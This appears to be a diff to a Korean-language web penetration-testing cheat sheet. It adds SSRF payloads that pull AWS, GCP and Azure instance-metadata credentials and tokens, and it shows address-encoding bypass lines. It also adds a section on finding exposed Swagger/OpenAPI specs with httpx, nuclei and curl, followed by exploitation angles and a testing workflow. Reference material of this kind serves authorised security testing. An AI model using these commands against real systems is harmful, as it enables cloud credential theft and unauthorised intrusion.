@@ -186,6 +186,19 @@ http://[::1]:80
 http://169.254.169.254/latest/meta-data/
 http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
 
+# AWS IMDSv2 (토큰 필요)
+curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+# → 토큰을 받아서 아래처럼 사용
+curl -s -H "X-aws-ec2-metadata-token: <TOKEN>" http://169.254.169.254/latest/meta-data/
+
+# GCP Metadata
+curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/
+curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure IMDS
+curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+
 # 우회 기법
 http://0x7f000001         # hex
 http://2130706433         # decimal
@@ -592,6 +605,50 @@ threads = [threading.Thread(target=race) for _ in range(20)]
 for t in threads: t.start()
 for t in threads: t.join()
 ```
+
+---
+
+## OpenAPI/Swagger 열거
+
+REST API 사양이 노출되면 엔드포인트/스키마/권한 모델을 빠르게 파악 가능.
+
+### 흔한 엔드포인트
+
+```text
+/swagger-ui.html
+/swagger
+/swagger.json
+/openapi.json
+/v2/api-docs
+/v3/api-docs
+/api-docs
+/docs
+```
+
+### 빠른 확인
+
+```bash
+# HTTP 상태/타이틀로 확인
+httpx -u https://target.com -paths /swagger,/swagger.json,/openapi.json,/v3/api-docs -status-code -title
+
+# nuclei 템플릿
+nuclei -t http/exposures/apis/swagger-ui.yaml -u https://target.com
+nuclei -t http/exposures/apis/openapi.yaml -u https://target.com
+
+# JSON 스키마 파싱
+curl -s https://target.com/openapi.json | jq '.paths | keys[]'
+```
+
+### 악용 포인트
+
+- Try-It-Out 프록시: Origin 검증 부재 시 CSRF/SSRF 연계
+- 인증 미적용 엔드포인트: `/api/v1/*`와 `/api/v2/*` 혼재로 우회
+- 스키마 불일치: 서버 실제 파라미터와 문서 상 차이 → HPP/IDOR 유발
+- 넓은 CORS와 결합: 자바스크립트에서 토큰 포함 요청 가능 여부 확인
+
+### 워크플로우
+
+1) 엔드포인트 탐지 → 2) 스키마 덤프 후 Postman/Insomnia 가져오기 → 3) 권한/경계 값 퍼징 → 4) 멱등성/RateLimit 검증 → 5) 비즈니스 로직 테스트
 
 ---
 
